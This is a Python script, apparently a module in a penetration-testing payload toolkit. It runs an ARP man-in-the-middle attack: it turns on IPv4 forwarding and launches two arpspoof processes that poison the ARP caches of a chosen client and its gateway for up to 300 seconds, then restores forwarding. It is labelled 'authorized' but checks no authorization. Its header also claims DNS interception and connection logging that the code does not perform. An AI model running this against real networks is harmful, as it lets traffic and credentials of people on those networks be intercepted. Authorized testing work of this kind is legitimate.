#!/usr/bin/env python3
# @name: Bounded ARP MITM Test
# @desc: Dedicated ARP Man-in-the-Middle attack with IP forwarding, optional DNS interception, and connection logging.
# @category: network
# @danger: true
# @active: true
# @web: true
# @inputs: [{"name":"client","label":"Authorized client IPv4","type":"text","required":true},{"name":"gateway","label":"Gateway IPv4","type":"text","required":true},{"name":"seconds","label":"Duration","type":"number","default":"30"}]

import ipaddress
import os
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path
from payloads._web_input import request_input


def main() -> int:
    if not shutil.which("arpspoof"):
        print("arpspoof is unavailable; install dsniff.")
        return 2
    try:
        client = str(ipaddress.IPv4Address(sys.argv[1])); gateway = str(ipaddress.IPv4Address(sys.argv[2])); seconds = max(1, min(int(sys.argv[3]), 300))
    except (IndexError, ValueError):
        print("Client, gateway, or duration is invalid.")
        return 2
    interfaces = sorted(p.name for p in Path("/sys/class/net").iterdir() if p.name != "lo")
    interface = str(request_input("Select network interface", input_type="select", choices=interfaces))
    forwarding = Path("/proc/sys/net/ipv4/ip_forward")
    previous = forwarding.read_text().strip()
    processes = []
    try:
        forwarding.write_text("1\n")
        processes = [
            subprocess.Popen(["arpspoof", "-i", interface, "-t", client, gateway], start_new_session=True),
            subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway, client], start_new_session=True),
        ]
        print(f"Interface: {interface} · Client: {client} · Gateway: {gateway}", flush=True)
        print(f"ARP redirection active for {seconds} seconds; IPv4 forwarding enabled.", flush=True)
        time.sleep(seconds)
        return 0
    finally:
        for process in processes:
            if process.poll() is None:
                os.killpg(process.pid, signal.SIGTERM)
        forwarding.write_text(previous + "\n")
        print(f"ARP redirection stopped; IPv4 forwarding restored to {previous}.", flush=True)


if __name__ == "__main__":
    raise SystemExit(main())
